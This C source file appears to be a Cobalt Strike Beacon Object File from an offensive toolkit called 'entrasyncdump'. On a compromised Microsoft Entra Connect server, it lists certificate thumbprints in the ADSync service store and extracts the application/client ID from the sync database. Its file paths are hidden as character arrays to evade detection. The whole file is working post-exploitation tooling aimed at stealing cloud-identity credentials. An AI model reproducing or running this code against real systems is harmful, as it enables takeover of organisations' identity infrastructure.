#include "entrasyncdump_common.h"


void cmd_dumpcertinfo(CONST WCHAR* overrideInstance) {

    ENTRACONNECT_VERSION ver = { 0 };

    if (!read_entra_version(&ver)) {
        BeaconPrintf(CALLBACK_ERROR, "Could not find or read target installation.\n");
        return;
    }

    CHAR verStr[32];
    API(MSVCRT, sprintf)(verStr, "%d.%d.%d.%d", ver.major, ver.minor, ver.build, ver.revision);

    if (ver.major < ENTRACONNECT_V2_MAJOR || (ver.major == 2 && ver.minor < ENTRACONNECT_ABA_PREVIEW_MINOR)) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "Version %s does not support certificate-based auth.\n"
            "Password-based auth only (no certificate info to extract).\n",
            verStr
        );
        return;
    }

    CONST CHAR* authNote = NULL;
    CONST CHAR* authType = classify_auth_type(&ver, &authNote);
    BeaconPrintf(CALLBACK_OUTPUT,
        "Version %s detected.\n"
        "Auth type: %s\n"
        "Checking for certificate material...\n\n",
        verStr, authType
    );

    // --- Enumerate certificate thumbprints ---
    WCHAR wCertDir[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','e','r','v','i','c','e','P','r','o','f','i','l','e','s','\\','A','D','S','y','n','c','\\','A','p','p','D','a','t','a','\\','R','o','a','m','i','n','g','\\','M','i','c','r','o','s','o','f','t','\\','S','y','s','t','e','m','C','e','r','t','i','f','i','c','a','t','e','s','\\','M','y','\\','C','e','r','t','i','f','i','c','a','t','e','s',0 };
    WCHAR wCertDirSearch[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','e','r','v','i','c','e','P','r','o','f','i','l','e','s','\\','A','D','S','y','n','c','\\','A','p','p','D','a','t','a','\\','R','o','a','m','i','n','g','\\','M','i','c','r','o','s','o','f','t','\\','S','y','s','t','e','m','C','e','r','t','i','f','i','c','a','t','e','s','\\','M','y','\\','C','e','r','t','i','f','i','c','a','t','e','s','\\','*',0 };

    WIN32_FIND_DATAW findData = { 0 };
    HANDLE hFind = API(KERNEL32, FindFirstFileW)(wCertDirSearch, &findData);

    INT certCount = 0;

    if (hFind == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] No certificates found (or directory inaccessible): %ls\n"
            "    Error: %d\n"
            "    If certificate auth is configured, material should be present here.\n",
            wCertDir, API(KERNEL32, GetLastError)()
        );
        goto query_clientid;
    }

    do {
        if (findData.cFileName[0] == L'.') continue;
        certCount++;
    } while (API(KERNEL32, FindNextFileW)(hFind, &findData));

    API(KERNEL32, FindClose)(hFind);

    if (certCount == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] No certificates found in target store: %ls\n"
            "    If certificate auth is configured, material should be present here.\n",
            wCertDir
        );
    } else if (certCount == 1) {
        hFind = API(KERNEL32, FindFirstFileW)(wCertDirSearch, &findData);
        do {
            if (findData.cFileName[0] != L'.') break;
        } while (API(KERNEL32, FindNextFileW)(hFind, &findData));
        API(KERNEL32, FindClose)(hFind);

        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] Found 1 certificate in target store.\n"
            "    Thumbprint: %ls\n"
            "    Path: %ls\n",
            findData.cFileName, wCertDir
        );
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] WARNING: Found %d certificates in target store - expected 1.\n"
            "    Multiple certificates may indicate rotation or misconfiguration.\n"
            "    Path: %ls\n",
            certCount, wCertDir
        );

        hFind = API(KERNEL32, FindFirstFileW)(wCertDirSearch, &findData);
        do {
            if (findData.cFileName[0] == L'.') continue;
            BeaconPrintf(CALLBACK_OUTPUT, "    Thumbprint: %ls\n", findData.cFileName);
        } while (API(KERNEL32, FindNextFileW)(hFind, &findData));
        API(KERNEL32, FindClose)(hFind);
    }


query_clientid:
    ;
    CONST CHAR* clientId = query_clientid_from_db(overrideInstance);

    if (clientId) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n[+] Application/Client ID (ABA): %s\n", clientId);
        BofHeapFree(clientId);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "\n[!] No Application/Client ID found in private_configuration_xml.\n"
            "    This is expected for password-based installs (Sync_*/MSOL_* accounts).\n"
        );
    }
}


#ifdef _DEBUG
void main(int argc, char* argv[]) {
    wchar_t wInstance[64] = { 0 };
    CONST wchar_t* instanceArg = NULL;
    if (argc >= 2 && argv[1][0]) {
        for (int i = 0; argv[1][i] && i < 63; i++) wInstance[i] = (wchar_t)argv[1][i];
        instanceArg = wInstance;
    }
    cmd_dumpcertinfo(instanceArg);
}
#else
void go(PCHAR args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    CHAR* instanceArgA = BeaconDataExtract(&parser, NULL);
    WCHAR instanceArgW[64] = { 0 };
    CONST WCHAR* instanceOverride = NULL;
    if (instanceArgA && API(MSVCRT, strlen)(instanceArgA) > 0) {
        toWideChar(instanceArgA, instanceArgW, 64);
        instanceOverride = instanceArgW;
    }
    cmd_dumpcertinfo(instanceOverride);
}
#endif
